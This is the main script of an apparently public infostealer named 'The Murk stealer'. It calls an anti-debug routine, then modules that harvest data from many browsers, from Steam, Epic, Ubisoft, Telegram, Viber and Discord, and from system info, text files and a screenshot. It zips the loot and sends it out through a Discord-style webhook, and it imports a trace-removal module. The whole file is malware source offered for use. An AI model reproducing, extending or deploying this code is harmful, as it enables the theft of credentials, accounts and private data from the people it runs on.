#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#

urlWebHook = ''
botName = ''

# do not change the value of the variables below
name = ''
password = ''
np = []


from scripts.send import make_folder
from scripts.system import system_info
from scripts.system import programs
from scripts.system import screenshoot
from scripts.browsers import chrome
from scripts.browsers import opera
from scripts.browsers import firefox
from scripts.another import telegram
from scripts.send import send 
from scripts.removal_of_traces import clear
from scripts.another import steam
from scripts.another import discord
from scripts.another import epicGames
# from scripts.another import wup
from scripts.another import Uplay
from scripts.another import viber
from scripts.browsers import edge
from scripts.browsers import brave
from scripts.browsers import chromeSxs
from scripts.browsers import torch
from scripts.browsers import brave
from scripts.browsers import yandex
from scripts.system import Files_txt
from scripts.secure import antiDebug


antiDebug.AntiDebug
make_folder.makeFolders()
chrome.Chrome()
edge.Edge()
yandex.Yandex()
epicGames.Epic()
Uplay.Ubisoft()
opera.Opera()
torch.Torch()
chromeSxs.Chrome_SxS()
firefox.Firefox()
brave.Brave()
steam.Steam()
system_info.SystemInfo()
Files_txt.TxtSteal()
programs.Programs()
telegram.Telegram()
viber.Viber()
discord.Discord()
screenshoot.Screenshot()



try:
    np = clear.makemeZip(name,password,np)
    pass
except Exception as e:
    print(e)
try:
    send.Send(urlWebHook,botName,np)
    pass
except Exception as e:
    print(e)